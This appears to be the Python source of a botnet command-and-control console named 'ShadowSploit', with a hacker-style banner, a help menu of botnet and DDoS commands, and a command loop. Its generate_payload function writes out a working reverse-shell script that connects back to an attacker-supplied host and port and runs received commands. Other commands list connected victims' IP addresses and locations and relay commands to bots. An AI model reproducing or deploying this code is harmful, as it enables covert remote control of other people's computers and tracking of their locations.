import time
from colorama import init, Fore, Back, Style
import re
import attack
import asyncio
from tabulate import tabulate
from pystyle import Colors, Colorate, Col, Center

init(autoreset=True)

def print_ascii_art():
    ascii_art = '''
    ▄▄▄█████▓ ██▓     ██▓     ███▄    █  ████▄ ▄███▓
    ▓  ██▒ ▓▒▓██▒    ▓██▒     ██ ▀█   █ ▓██▒▀█▀ ██▒
    ▒ ▓██░ ▒░▒██░    ▒██░    ▓██  ▀█ ██▒▓██    ▓██░
    ░ ▓██▓ ░ ▒██░    ▒██░    ▓██▒  ▐▌██▒▒██    ▒██ 
    ▒██▒ ░ ░██████▒░██████▒▒██░   ▓██░▒██▒   ░██▒
    ▒ ░░   ░ ▒░▓  ░░ ▒░▓  ░░ ▒░   ▒ ▒ ░ ▒░   ░  ░
        ░    ░ ░ ▒  ░░ ░ ▒  ░░ ░░   ░ ▒░░  ░      ░
    ░        ░ ░     ░ ░      ░   ░ ░ ░      ░   
                        ░  ░   ░  ░         ░        ░   
    '''
    gradient = Colors.DynamicMIX((Col.red, Col.purple, Col.blue))  # Gradient cho tiêu đề

    print(Colorate.Vertical(gradient, Center.XCenter(ascii_art)))  # Thêm màu sắc cho ASCII art

def show_system_info():
    # Gradient color for system info
    gradient = Colors.DynamicMIX((Col.blue, Col.light_green, Col.yellow))
    # Text to display
    system_info_text = "[*] N3TW0RK-X C0NTR0L SYST3M v2.1.0_alpha"

    # Correctly use Colorate.Horizontal with both arguments
    print(Colorate.Horizontal(gradient, system_info_text))
    
    print(Fore.LIGHTBLUE_EX + "[+] Nodes Active: 1337 | Threads: 666 | RAM: 32GB")
    print(Fore.LIGHTGREEN_EX + "[+] Network: ENCRYPTED | Status: ACTIVE | Uptime: 99.9%")
    print(Fore.LIGHTCYAN_EX + "[+] Systems: Unix/Win/Mac | Protocol: Custom/SSL3")
    print(Fore.LIGHTWHITE_EX + "[>] Type 'help' for available commands...\n")

def display_help():
    help_content = '''
Developer Commands
===================
    Command                           Description
    -------                           -----------
    edit                              Edit the current module or a file with the preferred editor
    irb                               Open an interactive Ruby shell in the current context
    log                               Display framework.log paged to the end if possible
    pry                               Open the Pry debugger on the current module or Framework
    reload_lib                        Reload Ruby library files from specified paths
    time                              Time how long it takes to run a particular command

Botnet Commands
===================
    Command                           Description
    -------                           -----------
    connect <IP> <PORT>               - Connect to a target machine at the specified IP and port
    disconnect                        - Disconnect from the current target
    scan                              - Scan the network for vulnerable targets
    exploit <TARGET>                  - Exploit a vulnerability on the specified target
    target <IP>                       - Set the target IP for attack
    botnet                            - Manage botnet operations (start, stop, control bots)
    launch <DDoS_TYPE>                - Launch a DDoS attack using the specified method (e.g., TCP, UDP, HTTP)

General Commands
===================
    Command                           Description
    -------                           -----------
    status                            - Check botnet status and active bots
    info <BOT_ID>                     - Get detailed information on a specific bot in the botnet
    stop <BOT_ID>                     - Stop or disable a specific bot from the botnet
    exit                              - Exit the terminal session
    update                            - Update botnet software to the latest version
    '''
    # Gradient color for the help content
    gradient = Colors.DynamicMIX((Col.cyan, Col.green, Col.blue))
    
    # Correctly use Colorate.Horizontal with both gradient and text
    print(Colorate.Horizontal(gradient, help_content))

def generate_payload(lhost, lport, output_file):
    """Tạo file payload chứa mã độc kết nối đến LHOST:LPORT"""
    payload_code = f"""
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    
    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode("utf-8"))
    
    s.close()

connect()
"""
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(payload_code)

    print(Fore.LIGHTGREEN_EX + f"[✔] Payload đã được tạo: {output_file}")

async def handle_command(command):
    pattern = r"ShadowSploit -p (\S+) LHOST=(\S+) LPORT=(\d+) -f (\S+) > (\S+)"
    match = re.match(pattern, command)
    if match:
        _, lhost, lport, _, output_file = match.groups()
        generate_payload(lhost, lport, output_file)
        return
    if command == "help":
        display_help()
    elif command == "status":
        print(Fore.LIGHTGREEN_EX + "Botnet status: Active 🟢")
    elif command == "exit":
        print(Fore.LIGHTRED_EX + "Exiting... 👋")
        exit()
    elif command == "GET_CLIENTS":
        gradient = Colors.DynamicMIX((Col.light_red, Col.light_blue))
        
        # Nhận dữ liệu từ server
        print(Colorate.Vertical(gradient, "[📊] Device Information:".center(60)))
        
        clients_data = await attack.send_message('GET_CLIENTS')

        # Xử lý từng client trong danh sách
        for ip, details in clients_data.items():
            data = {
                "IP": ip,
                "city": details.get("City", "Unknown"),
                "area": details.get("Area", "Unknown"),
                "country": details.get("Country", "Unknown"),
                "location": details.get("Location", "Unknown"),
                "network_provider": details.get("Network_provider", "Unknown"),
                  # Sử dụng IP làm tên thiết bị
            }
            row = [
                data["IP"],
                data["city"],
                data["area"],
                data["country"],
                data["location"],
                data["network_provider"],
            ]
            if data['IP'] == 'hacker':
                pass
            else:
            # In dữ liệu đã chèn vào, định dạng gọn gàng hơn
                print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.green)), f"{' | '.join(str(value) for value in row)}".center(60)))

            # Hiển thị đường phân cách dưới cùng
        print(Colorate.Horizontal(gradient, "=" * 60))
    elif command.startswith("SENDTO:"):
        clients_data = await attack.send_message(command)
        print(clients_data)
    else:
        print(Fore.LIGHTYELLOW_EX + f"[-] Unknown command: {command}. Type 'help' for available commands.")

async def main():
    print_ascii_art()
    show_system_info()

    while True:
        user_input = input(Fore.LIGHTRED_EX + "[ShadowSploit@kali]-[~] > " + Fore.LIGHTWHITE_EX)
        await handle_command(user_input)

if __name__ == "__main__":
    asyncio.run(main())
